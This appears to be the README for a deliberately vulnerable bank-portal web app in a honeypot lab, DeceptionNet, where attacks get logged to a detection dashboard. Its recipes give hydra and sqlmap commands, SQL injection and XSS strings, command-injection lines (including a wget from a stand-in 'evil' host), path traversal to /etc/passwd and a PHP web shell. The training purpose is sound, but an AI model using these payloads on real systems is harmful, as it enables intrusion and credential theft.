# DeceptionNet Attack Target Lab

A **deliberately vulnerable web application** ("Vertex Bank Employee Portal")
that gives you a real machine to attack. Every interaction — login guesses,
SQL injection, command injection, path traversal, XSS, uploads — is logged and
shipped through the **same event pipeline** as the Cowrie/Dionaea honeypots, so
it lands on the DeceptionNet dashboard as a **live, genuine attack session**
with MITRE ATT&CK mappings and an AI summary. This replaces the seeded/demo logs
with real ones you caused yourself.

> ⚠️ **This app is unsafe by design.** Run it only inside the isolated container
> (or a throwaway lab VM). Never expose it to the public internet.

---

## Quick start

### Option A — via Docker Compose (recommended, matches the project)

```bash
docker compose up --build -d attack-target
# the forwarder ships events automatically; just start the rest of the stack
docker compose up -d
```

The app is then at **http://localhost:9090**. Attack it from your host or from a
Kali/attacker container — everything you throw at it appears in the dashboard
at http://localhost:3000 (log in with `admin` / `deceptionnet`).

### Option B — standalone (no Docker), straight on your machine

```bash
pip install -r attack-target/requirements.txt
# ship events straight to core-api on localhost:8000
TARGET_LOG_FILE=logs/target.jsonl SHIP_EVENTS=true python attack-target/app.py
```

In this mode the app posts events directly to `CORE_API_URL`
(`http://localhost:8000/events` by default). Open http://localhost:9090 and attack.

---

## The "victim": Vertex Bank Employee Portal (http://localhost:9090)

| Endpoint | Vulnerability | What DeceptionNet detects |
|---|---|---|
| `POST /login` | SQL injection login bypass + **no brute-force lockout** | `login_failed` → T1110 Brute Force; `login` → T1078 Valid Accounts |
| `POST /ping` | OS command injection (host is spliced into a shell command) | `command` → MITRE keyword rules (T1003.008, T1033, T1105…) |
| `GET /read?file=` | Path traversal / LFI (no `../` guard) | `command` → T1003.008 when reading `/etc/passwd` |
| `GET /search?q=` | Reflected XSS (raw echo) | `http` → T1190 Exploit Public-Facing Application |
| `POST /upload` | Unrestricted file upload (webshells) | `file_upload` → T1048.003 Exfiltration |

---

## Attack recipes (copy-paste, run on your host)

### 1. Credential stuffing / brute force → T1110
```bash
# a few manual guesses
curl -s -X POST http://localhost:9090/login -d "username=root&password=toor"
curl -s -X POST http://localhost:9090/login -d "username=admin&password=wrong"
# real brute force with hydra (target your machine's LAN IP)
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
  "http://<LAN-IP>:9090/login:username=^USER^&password=^PASS^:Invalid"
```

### 2. SQL injection login bypass → T1078
```bash
curl -s -X POST http://localhost:9090/login \
  --data-urlencode "username=admin'--" --data-urlencode "password=x"
curl -s -X POST http://localhost:9090/login \
  --data-urlencode "username=' OR 1=1 --" --data-urlencode "password=x"
# or let sqlmap automate it
sqlmap -u "http://<LAN-IP>:9090/login" --data "username=a&password=b" --level 3
```

### 3. Command injection → T1003.008 / T1033 / T1105
```bash
# whoami -> T1033 System Owner/User Discovery
curl -s -X POST http://localhost:9090/ping -d "host=127.0.0.1; whoami"
# read /etc/passwd -> T1003.008 OS Credential Dumping
curl -s -X POST http://localhost:9090/ping -d "host=127.0.0.1; cat /etc/passwd"
# pull a tool in -> T1105 Ingress Tool Transfer
curl -s -X POST http://localhost:9090/ping -d "host=127.0.0.1; wget http://evil/x.sh"
```

### 4. Path traversal / LFI
```bash
curl -s "http://localhost:9090/read?file=../../../../etc/passwd"
curl -s "http://localhost:9090/read?file=../../etc/portal.conf"
```
Watch the severity jump — reading `/etc/passwd` weighs **5.0**.

### 5. Reflected XSS
```bash
curl -s "http://localhost:9090/search?q=<script>alert('owned')</script>"
```

### 6. Web shell upload
```bash
echo '<?php system($_GET["c"]); ?>' > shell.php
curl -s -F "file=@shell.php" http://localhost:9090/upload
```

### 7. Network / service scanning (feeds T1046)
```bash
nmap -sV -p 22,80,8080,9090 <LAN-IP>
```

---

## Where the logs land

- **App interaction logs:** `target_logs` volume → `/var/log/attack-target/target.jsonl`
  (each line is a JSON event).
- **Forwarder:** `log-forwarder-target` tails that file and `POST`s to
  `core-api:8000/events` → the dashboard.

The `honeypot` field for all these events is **`attack-target`**, so you can
filter sessions by honeypot on the dashboard and tell your lab traffic apart
from real decoy traffic.

## Files

- `app.py` — the vulnerable Flask app (the "victim").
- `target_forwarder.py` — ships interaction logs to core-api.
- `Dockerfile` / `Dockerfile.forwarder` — image definitions.
- `requirements.txt` — Flask + requests.

## Fixture

There's also a tiny seeded "database" (`USERS` in `app.py`) plus a fake
filesystem (`FAKE_FS`) so path-traversal targets exist to be read. The real
goal is that *your* live traffic replaces the fake dashboard logs — every scan,
guess, and payload below shows up as a real session the instant you send it.
